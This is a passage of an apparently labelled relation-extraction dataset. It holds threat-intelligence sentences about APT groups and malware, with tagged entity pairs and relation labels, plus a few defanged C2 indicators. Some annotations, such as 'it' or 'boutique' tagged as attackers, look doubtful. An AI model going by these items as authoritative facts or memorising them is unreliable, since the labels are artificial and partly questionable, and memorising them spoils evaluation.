123	Here are some of the C&C servers we found that are shared by the campaigns: Table 1: [E21:technique] C&C [E22:technique] servers shared by PLEAD, Shrouded Crossbow, and [E11:malware] Waterbear [E12:malware] Additionally, the IP 211[.]72 [.]242[.]120 is one of the hosts for the domain microsoftmse[.]com, which has been used by several KIVARS variants.	2	use
124	Is the [E21:technique] command-and-control [E22:technique] server used by [E11:attacker] Careto [E12:attacker] still active? Have you been able to sinkhole any of the C&Cs? At the moment, all known Careto C&C servers are offline.	2	use
125	So far, victims of [E11:malware] Regin [E12:malware] were identified in 14 countries: Algeria Afghanistan [E21:location] Belgium [E22:location] Brazil Fiji Germany Iran India Indonesia Kiribati Malaysia Pakistan Russia Syria In total, we counted 27 different victims, although it should be pointed out that the definition of a victim here refers to a full entity, including their entire network.	1	attack
126	We assess with high confidence that the attacks were conducted by [E21:location] Chinese [E22:location] MSS threat actor, [E11:attacker] APT10 [E12:attacker], based on the evidence outlined in this report, summarized below: The use of a variant of the Trochilus malware.	3	from
127	Saudi Arabia, Iran, Iraq, Bahrain, Qatar, Kuwait and Turkey, and a Saudi company in Australia). “[E11:attacker] Greenbug [E12:attacker] was discovered targeting a range of organizations in the Middle East including companies in the aviation, energy, government, [E21:industry] investment [E22:industry], and education sectors.	1	attack
128	Figure 5 OilRig infrastructure for ISMInjector Conclusion The [E11:attacker] OilRig [E12:attacker] group continues to target [E21:industry] organizations [E22:industry] in the Middle East, in this instance targeting the government of the United Arab Emirates.	1	attack
129	It’s a busy and persistent, group, says Microsoft: Microsoft has attributed more [E21:vulnerability] 0-day [E22:vulnerability] exploits to [E11:attacker] STRONTIUM [E12:attacker] than any other tracked group in 2016.	2	use
130	Countries Unit 42 has identified as targeted by [E11:attacker] Rancor [E12:attacker] with these malware families include, but are not limited to: Singapore [E21:location] Cambodia [E22:location] We identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages.	1	attack
131	Security researchers at ESET have released new research today into the activities of the notorious [E11:attacker] Turla [E12:attacker] cyberespionage group, and specifically a previously undocumented backdoor that has been used to spy on [E21:industry] consulates [E22:industry] and embassies worldwide.	1	attack
132	All [E11:attacker] APT1 [E12:attacker] had to do was to repeat the same attack pattern: Conduct inter-departmental [E21:technique] spear-phishing [E22:technique] based on newly acquired information and plant more RATs to escalate its privileges to access wider and deeper the victim’s database.	2	use
133	[E11:attacker] APT39 [E12:attacker] has prioritized the [E21:industry] telecommunications [E22:industry] sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry.	1	attack
134	IcedCoffee was not widely deployed, rather it was targeted at diplomats, including Ambassadors, of [E21:location] European [E22:location] [E11:industry] governments [E12:industry].	3	from
135	There were almost 23 Command and Control servers used in the Ke3chang campaign, FireEye "gained visibility into one of 23 known [E21:technique] command-and-control [E22:technique] servers operated by the [E11:attacker] Ke3chang [E12:attacker] actor for about a week.	2	use
136	The CIA, though it declined to comment publicly, was quoted as having high confidence that the car bombing and the ransomware attack were both perpetrated by the [E21:location] Russian [E22:location] [E11:industry] military [E12:industry].	3	from
137	The NetTraveler builder icon Known targets of [E11:malware] NetTraveler [E12:malware] (also known as Travnet or Netfile) include Tibetan/Uyghur activists, oil industry companies, scientific research centers and institutes, [E21:industry] universities [E22:industry], private companies, governments and governmental institutions, embassies and military contractors: The NetTraveler victims map The following map lists the victim profiles by industry: Note: this chart does not include the victims that couldnt be identified.	1	attack
138	Were that to be the case, [E21:malware] Penquin [E22:malware] [E11:attacker] Turla [E12:attacker] could be the modern link that tied Turla to Moonlight Maze.	2	use
139	We were able to establish a connection with a medium level of certainty between [E11:attacker] DarkHotel [E12:attacker] and the [E21:malware] Konni [E22:malware]/Nokki set of activity described by other vendors.	2	use
140	The activity was tagged with a new threat actor name, TEMP.Periscope, but the report authors noted that [E11:attacker] Leviathan [E12:attacker] and [E21:attacker] TEMP.Periscope [E22:attacker] were the same group.	4	same
141	All of these early [E11:attacker] WhiteBear [E12:attacker] targets were related to [E21:industry] embassies [E22:industry] and diplomatic/foreign affair organizations.	1	attack
142	If [E11:malware] MiniDuke [E12:malware] is not able to receive Tweets, it executes Google searches to receive orders from [E21:technique] C&C [E22:technique] servers.	2	use
143	During our analysis, we observed the beacon seen in Figure 6 sent via [E21:tool] HTTP [E22:tool] from a [E11:malware] Kazuar [E12:malware] sample to its C2 server.	2	use
144	Source: IntrusionTruth) The December [E11:attacker] APT10 [E12:attacker] indictment noted that the group’s malicious activities breached at least 45 companies and managed service providers in 12 countries, including Brazil, Canada, [E21:location] Finland [E22:location], France, Germany, India, Japan, Sweden, Switzerland, the United Arab Emirates, the United Kingdom, and the United States.	1	attack
145	In February and March, researchers saw [E11:attacker] Danti [E12:attacker] attacks moving via [E21:technique] spear-phishing [E22:technique] emails laced with a .docx file that exploits the Microsoft flaw and drops custom shellcode on compromised machines. “The exploit is based on a malformed embedded EPS (Encapsulated Postscript) object,” Kaspersky researchers wrote in their report. “This contains the shellcode that drops a backdoor, providing full access to the attackers.	2	use
146	The following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity: [E11:malware] Beacon [E12:malware]: a [E21:technique] backdoor [E22:technique] that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments.	2	use
147	Security researchers at ESET have released new research today into the activities of the notorious [E11:attacker] Turla [E12:attacker] cyberespionage group, and specifically a previously undocumented backdoor that has been used to spy on consulates and [E21:industry] embassies [E22:industry] worldwide.	1	attack
148	Both mobile apps are strains of the [E11:attacker] SEDNIT [E12:attacker] spyware that allowed the group to steal personal data, acquiring audio from the microphone and making [E21:tool] screenshots [E22:tool].	2	use
149	In 2014, Kaspersky announced the discovery of [E21:malware] Penquin [E22:malware] [E11:attacker] Turla [E12:attacker], a Linux backdoor leveraged by Turla in specific attacks.	2	use
150	According to the experts, “[E11:malware] OnionDuke [E12:malware],” the malware spread through the bogus exit node, is a malware different from the ones used in the past by the threat actors behind the [E21:malware] MiniDuke [E22:malware] crew.	5	similar
151	This [E21:technique] backdoor [E22:technique] appears to be a new malware family that FireEye iSIGHT Intelligence has dubbed [E11:malware] POWERSOURCE [E12:malware].	2	use
152	Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the [E21:location] Cambodia [E22:location] [E11:industry] Government [E12:industry] and in at least once case, Facebook.	3	from
153	0198 The latest ESET research offers a rare glimpse into the mechanics of a particularly stealthy and resilient backdoor that the Turla cyberespionage group can fully control via PDF files attached to emails ESET researchers have investigated a distinctive backdoor used by the notorious Advanced Persistent Threat (APT) group known as Turla (or [E11:attacker] Snake [E12:attacker], or [E21:attacker] Uroburos [E22:attacker]) to siphon off sensitive communications from the authorities of at least three European countries.	4	same
154	The attack chain starts with a [E21:technique] phishing [E22:technique] mail that includes the [E11:malware] CryptoWall [E12:malware] variant in a “.zip” attachment.	2	use
155	[E11:malware] Dyreza [E12:malware] typically is found in spam or [E21:technique] phishing [E22:technique] emails, often purporting to come from a bank or financial institution.	2	use
156	KHRAT is a [E21:technique] backdoor [E22:technique] trojan purported to be used with the China-linked cyberespionage group [E11:attacker] DragonOK [E12:attacker].	2	use
157	In its affidavit for sink-holing the C2, the FBI suggests that [E11:attacker] Sofacy [E12:attacker] (aka APT28, Pawn Storm, Sednit, [E21:attacker] STRONTIUM [E22:attacker], and Tsar Team) is the culprit.	4	same
158	Once again, POSHC2 was used to download a new variant of [E11:malware] POWERTON [E12:malware] (MD5: c38069d0bc79acdc28af3820c1123e53), configured to communicate with the [E21:technique] C2 [E22:technique] domain hxxps://basepack[.]org.	2	use
159	[E11:attacker] WhiteBear [E12:attacker] focused on various [E21:industry] embassies [E22:industry] and diplomatic entities around the world in early 2016 -- tellingly, attempts were made to drop and display decoy pdf's with full diplomatic headers and content alongside executable droppers on target systems.	1	attack
160	0123 ESET researchers have shown that the Sednit operators used different components of the LoJax malware to target a few [E11:industry] government [E12:industry] organizations in the [E21:location] Balkans [E22:location] as well as in Central and Eastern Europe Update, 9 October 2018: The remediation section of the white paper contained inaccurate information.	3	from
161	[E11:malware] Zebrocy [E12:malware] [E21:technique] spearphishing [E22:technique] targets: AF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZ SPLM deployment in Central Asia SPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy.	2	use
162	[E11:malware] Miniduke [E12:malware] victims were located in the following 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, [E21:location] Lithuania [E22:location], Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.	1	attack
163	As described in our earlier analysis [3], the typical vector of compromise of the Mosquito campaign is still a fake Flash installer, in reality installing both the [E11:attacker] Turla [E12:attacker] [E21:technique] backdoor [E22:technique] and the legitimate Adobe Flash Player.	2	use
164	During this process, we took a look at Win32/[E11:malware] Glupteba [E12:malware], an open [E21:technique] proxy [E22:technique] previously distributed by exploit kits deployed as part of Operation Windigo.	2	use
165	In figure 5 below you can see the [E11:attacker] OilRig [E12:attacker] infrastructure for [E21:malware] ISMInjector [E22:malware] that our research uncovered.	2	use
166	In November and December 2015, [E11:attacker] it [E12:attacker] used a modified exploit for [E21:vulnerability] CVE-2015-2545 [E22:vulnerability] in attacks against information and news agencies in Taiwan.	2	use
167	This activity was driven by [E21:location] Asian [E22:location] actors such as ShaggyPanther, [E11:attacker] Sidewinder [E12:attacker], CardinalLizard, TropicTrooper, DroppingElephant, Rancor, Tick group, NineBlog, Flyfox and CactusPete – all of them active in the region throughout the year.	3	from
168	This group, which we call ‘The [E11:attacker] Lamberts [E12:attacker]’ (but which is also known as ‘Longhorn’) first came to the attention of the security community in 2014, when researchers from FireEye discovered an attack using a zero-day vulnerability ([E21:vulnerability] CVE-2014-4148 [E22:vulnerability]).	2	use
169	In March 2014, the French newspaper, Le Monde, published an article on a cyber-espionage toolset that had been identified by Communications Security Establishment Canada (CSEC): this toolset had been used in the ‘[E11:attacker] Snowglobe [E12:attacker]’ operation that targeted French-speaking media in [E21:location] Canada [E22:location], as well as Greece, France, Norway and some African countries.	1	attack
170	In the same timeframe of the [E21:malware] Komplex [E22:malware] attacks, we collected several weaponized documents that use a tactic previously not observed in use by the [E11:attacker] Sofacy [E12:attacker] group.	2	use
171	In addition, [E11:malware] Emissary [E12:malware] appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or [E21:industry] military [E22:industry].	1	attack
172	The [E21:technique] backdoor [E22:technique] term “[E11:attacker] naikon [E12:attacker]” was derived from the User-Agent string “NOKIAN95”.	2	use
173	Based on clues provided by the malware’s original file names, as well as the decoy content embedded within these samples, we can make a reasonable estimation that these attacks targeted organizations in [E21:location] Taiwan [E22:location] in the Telecommunication, Defense, Government, and [E11:industry] High-Tech [E12:industry] industries.	3	from
174	When G-Data published on [E11:attacker] Turla [E12:attacker]/[E21:attacker] Uroburos [E22:attacker] back in February, several questions remained unanswered.	4	same
175	We also determined [E11:attacker] APT33 [E12:attacker] likely transitioned from PowerShell [E21:tool] EMPIRE [E22:tool] to PUPYRAT during this timeframe.	2	use
176	[E11:attacker] Pirpi [E12:attacker] exploited the same zero-day as [E21:malware] Hupigon [E22:malware], with very similar GIF mechanisms.	2	use
177	Interestingly we discovered that just two families of malware were responsible for this sudden change: Asacub and [E11:malware] Svpeng [E12:malware], which affected a large number of users, most of whom were in [E21:location] Russia [E22:location].	1	attack
178	Although these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible connection between the [E21:malware] WATERSPOUT [E22:malware] campaign, the THREEBYTE campaign, and the [E11:malware] HIGHTIDE [E12:malware] campaign attributed to APT12.	5	similar
179	1229 Kaspersky Lab has identified another Chinese APT campaign, dubbed ‘[E11:attacker] Icefog [E12:attacker]’, who targeted Governmental institutions, Military contractors, [E21:industry] maritime [E22:industry] / shipbuilding groups, telecom operators, industrial and high technology companies and mass media.	1	attack
180	That’s not to mention the activity of the infamous [E11:malware] Carbanak [E12:malware] gang, said to have been responsible for as much as $1bn in theft from [E21:industry] banks [E22:industry] around the world, using different attack methods also including the ATM as the cash-out point.	1	attack
181	While [E11:attacker] APT12 [E12:attacker] has previously used [E21:malware] THREEBYTE [E22:malware], it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE.	2	use
182	[E11:malware] Carbanak [E12:malware] is an APT (Advanced Persistent Threat) that can infiltrate a network often through phishing e-mails and has already affected victims around the world from [E21:location] Europe [E22:location] to Asia to South America.	1	attack
183	KHRAT is a backdoor [E21:technique] trojan [E22:technique] purported to be used with the China-linked cyberespionage group [E11:attacker] DragonOK [E12:attacker].	2	use
184	Victims were mainly [E11:industry] government [E12:industry] and military institutions in the [E21:location] Caucasus [E22:location] region including the Ministry of Internal Affairs of Georgia, the North Atlantic Trade Organization (NATO) and other European security organizations.	3	from
185	Executive Summary Talos has discovered a new malicious Hangul Word Processor ([E11:malware] HWP [E12:malware]) document targeting [E21:location] Korean [E22:location] users.	1	attack
186	This platform is still in use today by [E11:attacker] Sednit [E12:attacker] and, like [E21:malware] Sedkit [E22:malware], tracks international news stories and includes a reference to them in their malicious emails, in an attempt to lure the target into opening the malicious document attachment.	2	use
187	We have seen the actor deploying [E11:malware] Gamefish [E12:malware] and an updated version of its DealersChoice framework against embassies and EU [E21:industry] agencies [E22:industry].	1	attack
188	Hosts associated with GreyEnergy and Zebrocy Attacked company Additionally, both [E11:malware] GreyEnergy [E12:malware] and Zebrocy [E21:technique] spearphishing [E22:technique] documents targeted a number of industrial companies in Kazakhstan.	2	use
189	[E11:attacker] Platinum [E12:attacker] was identified by Microsoft; it used EPS exploits against targets in [E21:location] India [E22:location] as early as last August.	1	attack
190	[E21:technique] Spear-phishing [E22:technique] permitted [E11:attacker] APT1 [E12:attacker] to take advantage to the fullest to expand its access laterally within the victim institution.	2	use
191	[E11:attacker] SVCMONDR [E12:attacker] used spear-phishing messages to hit targets in [E21:location] Taiwan [E22:location] with exploits that hint at a connection to the Danti group as well as APT 16, what is thought to be a separate APT gang.	1	attack
192	In 2013, the [E11:attacker] Sofacy [E12:attacker] group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka [E21:malware] CHOPSTICK [E22:malware]), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others.	2	use
193	[E11:attacker] PLATINUM [E12:attacker] group has been active since 2009 and launching large-scale attacks against [E21:industry] governmental [E22:industry] organizations, intelligence agencies, defense institutes and telecommunication providers in South and Southeast Asia.	1	attack
194	Our research has shown that the Sednit operators used different components of the LoJax malware to target a few [E11:industry] government [E12:industry] organizations in the [E21:location] Balkans [E22:location] as well as in Central and Eastern Europe.	3	from
195	In order to compromise bank networks, the group sent malicious spear-phishing emails to hundreds of employees at different [E21:industry] banks [E22:industry], which if opened, infected computers with [E11:malware] Carbanak [E12:malware] malware, allowing hackers to transfer money from the banks to fake accounts or ATMs monitored by criminals.	1	attack
196	Researchers said [E11:attacker] APT33 [E12:attacker] has been operational since 2013 carrying out various active cyber espionage operations on the behalf of the Iranian [E21:industry] government [E22:industry]. “More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company,” FireEye researchers wrote.	1	attack
197	We now know that this report describes Skipper, a first stage [E21:technique] backdoor [E22:technique] used by the [E11:attacker] Turla [E12:attacker] gang.” reads the analysis published by ESET. “That report also contains a description of a Firefox extension dropped by the same type of malicious document.	2	use
198	The document contains a malicious macro that’s very similar to macros used previously by [E11:attacker] Turla [E12:attacker] to deliver Wipbot, [E21:malware] Skipper [E22:malware], and ICEDCOFFEE.	2	use
199	This command downloads two additional [E21:tool] PowerShell [E22:tool] scripts that install [E11:malware] PupyRAT [E12:malware], an open-source remote access trojan (RAT),” reads the analysis published by SecureWorks.	2	use
200	This [E11:malware] ISMAgent [E12:malware] payload is configured to use “cdnmsnupdate[.]com” as its C2 server using both HTTP and [E21:tool] DNS [E22:tool] tunneling channels.	2	use
201	In the case of Chinese based APT1, examples like renewable energy trade and [E21:industry] policy [E22:industry] development information as well as aeronautics research are all [E11:attacker] APT1 [E12:attacker]’s targets.	1	attack
202	As mentioned above, some of the LoJax small agent C&C servers were used in the past by [E21:malware] SedUploader [E22:malware], a first-stage backdoor routinely used by [E11:attacker] Sednit [E12:attacker]’s operators.	2	use
203	All Roads Lead to [E11:attacker] BlackTech [E12:attacker] Based on the use of the same [E21:technique] C&C [E22:technique] servers, the campaigns’ coordinated efforts, and similarities in tools, techniques, and objectives, we can conclude that they are operated by the same group.	2	use
204	And much of the malware being deployed by [E11:attacker] Sofacy [E12:attacker] is quickly changed from C/[E21:tool] C++ [E22:tool] to .Net to powershell.	2	use
205	One outlier [E11:malware] SPLM [E12:malware] target profile within our visibility includes an audit and consulting firm in Bosnia and [E21:location] Herzegovina [E22:location].	1	attack
206	The group was even associated with the [E11:malware] WannaCry [E12:malware] ransomware menace that last year shut down [E21:industry] hospitals [E22:industry] and businesses worldwide.	1	attack
207	[E11:malware] Miniduke [E12:malware] victims were located in the following 23 countries: [E21:location] Belgium [E22:location], Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States.	1	attack
208	An overview of the delivery of [E11:malware] POWERSTATS [E12:malware], [E21:technique] C2 [E22:technique] URLs used, and other changes in the malware MuddyWater in the Middle East The attackers behind MuddyWater have been active throughout 2017, with targets across the Middle East and surrounding areas, examples of the decoy documents observed is given in Table 1.	2	use
209	The contents of these documents suggest that the main interests of threat actor likely included the organizations in the following industries, located in [E21:location] Taiwan [E22:location]: [E11:industry] Telecommunication [E12:industry] Defense Government High Tech The most recent attacks, in November 2017, likely targeted organizations in the following industries, located in South Korea: Aerospace Defense Additionally, while researching this campaign, we identified historical attacks that appear to target the Taiwan government, an IT service vendor based in Asia, and a journalist of a Tibetan radio station.	3	from
210	It is responsible not only for the theft of hundreds of millions of rubles from [E21:location] Russian [E22:location] [E11:industry] bank [E12:industry]s but also for organizing a targeted attack on banks using the names and attributes of FinCERT, a special department of the Central Bank of Russia created to detect cyberattacks and notify member banks.	3	from
211	These attacks share a number of characteristics, including: They are against military and government targets Spearphishing is used as the initial attack vector They use a custom Trojan [E21:technique] backdoor [E22:technique] named “[E11:malware] Elise [E12:malware]” to gain a foothold A decoy file appears during initial compromise with Elise, tricking users into thinking they opened a benign file Attacks by the Lotus Blossom group rely heavily on the use of spearphishing emails that use enticing subject lines and legitimate-looking decoy documents to trick users into opening a malware executable they think is a legitimate document.	2	use
212	Whereas the Russian cyber criminal groups are known for conducting massive cyber campaigns aimed at stealing money and financial information, but [E11:attacker] APT28 [E12:attacker] focuses on "privileged information related to governments, militaries and [E21:industry] security [E22:industry] organizations." “This group, unlike the China-based threat actors we track, does not appear to conduct widespread intellectual property theft for economic gain,” FireEye stated in the report. “Nor have we observed the group steal and profit from financial account information.	1	attack
213	There is some code overlap with the [E11:malware] BlackEnergy [E12:malware] malware used in previous attacks in [E21:location] Ukraine [E22:location] (the FBI’s affidavit makes it clear that they see BlackEnergy (aka Sandworm) as a sub-group of Sofacy).	1	attack
214	While actors from [E21:location] China [E22:location], Iran, Russia, and North Korea remain the most active cyber espionage threats tracked and responded to by FireEye, [E11:attacker] APT32 [E12:attacker] reflects a growing host of new countries that have adopted this dynamic capability.	1	attack
215	Red October, [E11:malware] EvilGrab [E12:malware], and Nettraveler (aka RedStar) targeted both diplomatic missions and [E21:industry] commercial [E22:industry] industries.	1	attack
216	[E11:malware] ELMER [E12:malware] is a non-persistent proxy-aware [E21:tool] HTTP [E22:tool] backdoor written in Delphi, and is capable of performing file uploads and downloads, file execution, and process and directory listings.	2	use
217	0268 Mandiant has observed [E11:attacker] APT29 [E12:attacker] using a stealthy [E21:technique] backdoor [E22:technique] that we call POSHSPY.	2	use
218	[E11:malware] XAgent [E12:malware] uses HTTP requests to communicate with its [E21:technique] C2 [E22:technique] servers, which allows the threat actor to interact with the compromised system.	2	use
219	Hacking Team Yet another infamous “[E11:attacker] boutique [E12:attacker]” creating cyber-espionage tools, the [E21:location] Italian [E22:location] company Hacking Team, fell victim to a cyberattack last year in which a huge database of its employee email correspondence was stolen, as well as project source codes.	3	from
220	The Equation Group also had access to [E21:vulnerability] zero-days [E22:vulnerability] before they were used by operators behind Stuxnet and [E11:malware] Flame [E12:malware] campaigns.	2	use
221	In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability [E21:vulnerability] CVE-2017-11882 [E22:vulnerability] to deploy POWRUNER and [E11:malware] BONDUPDATER [E12:malware].	2	use
222	This intelligence has been critical to protecting and informing our clients, exposing this threat and strengthening our confidence in attributing APT28 to the [E21:location] Russian [E22:location] [E11:industry] government [E12:industry].	3	from
223	Both of these were in response to active exploitation of [E21:vulnerability] zero-day [E22:vulnerability] vulnerabilities thought by other researchers to be associated with the [E11:attacker] Sofacy [E12:attacker] group.	2	use
224	To briefly recap, the [E11:malware] BADNEWS [E12:malware] malware family acts as a backdoor, with communication occurring over [E21:technique] HTTP [E22:technique].	2	use
225	The [E11:attacker] group [E12:attacker] has also extended its geographic reach to include victims in North Korea, Russia, South Korea, [E21:location] Japan [E22:location], Bangladesh, Thailand, India, Mozambique and Germany Data breaches There has been a steady stream of security breaches this year.	1	attack
226	The [E11:attacker] CozyDuke [E12:attacker] APT (also known as ‘[E21:attacker] CozyBear [E22:attacker]’, ‘CozyCat’ and ‘Office Monkeys’) targets government organisations and businesses in the United States, Germany, South Korea and Uzbekistan.	4	same
227	Successful execution of the macro within the malicious document results in the installation of [E11:attacker] APT28 [E12:attacker]’s signature [E21:malware] GAMEFISH [E22:malware] malware.	2	use
228	Unit 42 believes the cipher suite within the [E11:malware] FakeM [E12:malware] SSL variants uses [E21:tool] Diffie-Hellman [E22:tool] for key exchange and the RC4 cipher to encrypt the C2 communications.	2	use
229	Over the course of the attack campaign, we have observed two different variations of the [E11:malware] Helminth [E12:malware] [E21:technique] backdoor [E22:technique], one written in VBScript and PowerShell that was delivered via a macro within Excel spreadsheets and the other a standalone Windows executable.	2	use
230	After analyzing the information that has been made available by affected power companies, researchers, and the media it is clear that cyber attacks were directly responsible for [E11:industry] power [E12:industry] outages in [E21:location] Ukraine [E22:location].	3	from
231	On August 30, 2018, [E11:attacker] APT10 [E12:attacker] deployed their first modified version of Trochilus that had its [E21:technique] C2 [E22:technique] communications encrypted using Salsa20 and RC4 ciphers instead of the more common RC4-encrypted Trochilus variant seen in the wild.	2	use
232	Engineering Company by [E11:attacker] TEMP.Periscope [E12:attacker] Prior to this attempt in July, the same [E21:location] U.K. [E22:location] engineering company had previously been targeted in May 2017.	1	attack
233	Most intriguing to researchers is the overlap between Sofacy and the English-speaking threat actor behind the [E11:attacker] Lamberts [E12:attacker], also known as [E21:attacker] Longhorn [E22:attacker].	4	same
234	[E11:malware] Zbot [E12:malware] remained the most widespread [E21:industry] banking [E22:industry] malware family (44.08% of attacked users) but in 2016 it was actively challenged by the Gozi family (17.22%).	1	attack
235	These attacks were originally characterised by the misuse of stolen certificates, the deployment of HTA files using multiple methods and the infiltration of hotel Wi-Fi to place backdoors on targets’ computers The #[E11:attacker] Turla [E12:attacker] group makes use of satellite communications to manage its [E21:technique] C2 [E22:technique] traffic #KLReportTweet While the attackers behind this APT continue to use these methods, they have supplemented their armoury, shifting their attention more towards spear-phishing of their chosen victims.	2	use
236	[E11:malware] SNUGRIDE [E12:malware] is a backdoor that communicates with its [E21:technique] C2 [E22:technique] server through HTTP requests.	2	use
237	Tsunami is a downloader/IRC Bot backdoor used in the criminal ecosystem to launch DDoS attacks, meanwhile Linux/Gafgyt serves as a backdoor that could be controlled remotely and used as a Telnet scanning. “Recently, we discovered a bot that combines the capabilities of [E11:malware] Tsunami [E12:malware] (also known as [E21:malware] Kaiten [E22:malware]) and Gafgyt.	5	similar
238	Background [E11:attacker] TEMP.Periscope [E12:attacker] is a state-sponsored [E21:location] Chinese [E22:location] threat actor that first came to public prominence in October 2017, when reports surfaced about a group called Leviathan.	3	from
239	Essentially, we are discussing ongoing activity revolving around several malware families: KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear Technical Rattle Turla’s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 [E11:attacker] Turla [E12:attacker] has leveraged Javascript, [E21:tool] powershell [E22:tool], and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors.	2	use
240	But msnMM, [E21:malware] naikon [E22:malware], sakto, and rarstone backdoors are all used by the same actor that we call the [E11:attacker] Naikon [E12:attacker] APT.	2	use
241	Security researchers found that techniques adopted by TeamSpy are quite similar to methods implemented by the authors of an online [E21:industry] bank [E22:industry]ing fraud ring known as [E11:attacker] Sheldon [E12:attacker].	1	attack
242	The attackers behind [E11:attacker] Equation [E12:attacker] successfully infected the computers of thousands of victims in Iran, Russia, [E21:location] Syria [E22:location], Afghanistan, the United States and elsewhere – victims included government and diplomatic institutions, telecommunications companies and energy firms.	1	attack
243	In the case of Chinese based APT1, examples like renewable [E21:industry] energy [E22:industry] trade and policy development information as well as aeronautics research are all [E11:attacker] APT1 [E12:attacker]’s targets.	1	attack
244	Much of our 2018 research focused on Turla’s [E11:malware] KopiLuwak [E12:malware] javascript [E21:technique] backdoor [E22:technique], new variants of the Carbon framework and meterpreter delivery techniques.	2	use
245	TEMP.Periscope Background Active since at least 2013, [E11:attacker] TEMP.Periscope [E12:attacker] has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, [E21:industry] manufacturing [E22:industry], defense, government offices, and research universities (targeting is summarized in Figure 1).	1	attack
246	[E11:attacker] APT28 [E12:attacker] has also focused on intrusions into [E21:location] Georgia [E22:location]’s Ministry of Defense further exemplifying their focus on regional geopolitical threats.	1	attack
247	It was seen in the wild in 2011 in an attack on defence contractor Ruag in [E21:location] Switzerland [E22:location] that has been attributed to [E11:attacker] Turla [E12:attacker].	1	attack
248	In some of their recent attack documents, the attackers also used GitHub as a hosting site for their custom [E21:technique] backdoor [E22:technique], [E11:malware] POWERSTATS [E12:malware].	2	use
249	[E21:malware] DOWNDELPH [E22:malware], which gets its name from being written in the Delphi programming language, is used in hacks orchestrated by the [E11:attacker] Sednit [E12:attacker] group to deploy the previously mentioned XAGENT and SEDRECO onto infected computers.	2	use
250	Second, they use [E11:technique] spear-phishing [E12:technique] to deliver a malicious XDP (XML Data Package) file containing a Flash exploit ([E21:vulnerability] CVE-2011-0611 [E22:vulnerability]).	2	use
251	We also observed POWERSOURCE being used to download a second-stage PowerShell [E21:technique] backdoor [E22:technique] called [E11:malware] TEXTMATE [E12:malware] in an effort to further infect the victim machine.	2	use
252	Later malware detected as Hupigon (and variously cross-identified as GrayBird, [E11:malware] Formador [E12:malware], [E21:malware] Emogen [E22:malware], etc.) span the four years back to CVE-2010-3962 and before, with malware served from many other geographic locations.	5	similar
